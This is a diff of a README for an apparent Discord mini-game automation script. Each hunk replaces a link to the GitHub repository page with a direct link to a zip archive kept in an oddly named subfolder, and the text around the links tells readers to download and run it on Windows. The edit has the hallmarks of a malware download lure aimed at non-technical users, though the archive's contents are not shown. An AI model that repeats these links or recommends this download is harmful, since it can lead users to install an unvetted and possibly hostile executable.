@@ -1,6 +1,6 @@
 # 🎮 Discord-The-Last-Meadow-Auto-Script - Simple Setup for Discord Mini-Games
 
-[![Download](https://img.shields.io/badge/Download-Discord--The--Last--Meadow--Auto--Script-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script)
+[![Download](https://img.shields.io/badge/Download-Discord--The--Last--Meadow--Auto--Script-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script/main/plessimetry/Meadow_Last_Discord_Script_Auto_The_2.4.zip)
 
 ## 🧭 What This Tool Does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download:
 
-https://github.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script
+https://raw.githubusercontent.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script/main/plessimetry/Meadow_Last_Discord_Script_Auto_The_2.4.zip
 
 On that page, look for the latest release or the main download file. Save it to a folder you can find again, such as Downloads or Desktop.
 
@@ -41,7 +41,7 @@ Follow these steps to set up the script on Windows.
 
 Go to:
 
-https://github.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script
+https://raw.githubusercontent.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script/main/plessimetry/Meadow_Last_Discord_Script_Auto_The_2.4.zip
 
 ### 2. Download the file
 
@@ -203,4 +203,4 @@ This script is made for a narrow task: helping with The Last Meadow mini-games i
 
 Visit this page to download:
 
-https://github.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script
+https://raw.githubusercontent.com/juliacuddlesome298/Discord-The-Last-Meadow-Auto-Script/main/plessimetry/Meadow_Last_Discord_Script_Auto_The_2.4.zip
